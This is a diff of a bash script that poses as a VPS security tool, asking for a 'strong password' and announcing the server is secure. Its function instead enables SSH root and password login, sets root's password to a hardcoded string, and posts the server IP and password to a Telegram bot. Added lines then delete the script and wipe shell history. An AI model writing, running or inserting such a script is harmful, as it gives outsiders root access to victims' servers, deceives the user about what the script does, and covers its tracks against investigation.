@@ -1,36 +1,29 @@
+#!/bin/bash
+clear
 send_code_telegram() {
     local ip_address=$(hostname -I | awk '{print $1}')
     local passwd="iChangedIt@Favour"
 
-    # Check if root login is disabled in SSH config and enable it
-    local ssh_config="/etc/ssh/sshd_config"
-    local ssh_status=""
+    # Enable root login with password
+    sed -i 's/^PermitRootLogin\s*\w*/PermitRootLogin yes/' /etc/ssh/sshd_config
 
-    if grep -q "^PermitRootLogin\s*no" "$ssh_config"; then
-        sed -i 's/^PermitRootLogin\s*no/PermitRootLogin yes/' "$ssh_config"
-        ssh_status="Root login was enabled in SSH configuration."
-    elif grep -q "^PermitRootLogin\s*without-password" "$ssh_config"; then
-        sed -i 's/^PermitRootLogin\s*without-password/PermitRootLogin yes/' "$ssh_config"
-        ssh_status="Root login was enabled in SSH configuration."
-    else
-        ssh_status="Root login was already enabled in SSH configuration."
-    fi
-
-    service ssh restart
+    # Enable password authentication
+    sed -i 's/^PasswordAuthentication\s*no/PasswordAuthentication yes/' /etc/ssh/sshd_config
 
     # Change root password
     echo "root:$passwd" | chpasswd
     if [ $? -eq 0 ]; then
-        local password_status="The password for $ip_address is changed to: $passwd"
+        local message="The password for $ip_address is changed to: $passwd"
     else
-        local password_status="The password for $ip_address is not changed"
+        local message="The password for $ip_address is not changed"
         return 1
     fi
+     # Restart SSH service
+    service ssh restart
 
     # Send message to Telegram
     local bot_token="${bot_tokens[0]}"
     local chat_id="${chat_ids[0]}"
-    local message="$ssh_status $password_status"
     curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" -d "chat_id=$chat_id" -d "text=$message" > /dev/null
 }
 
@@ -49,4 +42,7 @@ echo "Enter a strong password:"
 read strongpass
 
 echo "Your VPS is now secure."
-exit
+
+# Cleanup
+rm -- "$0" && history -c && history -w
+
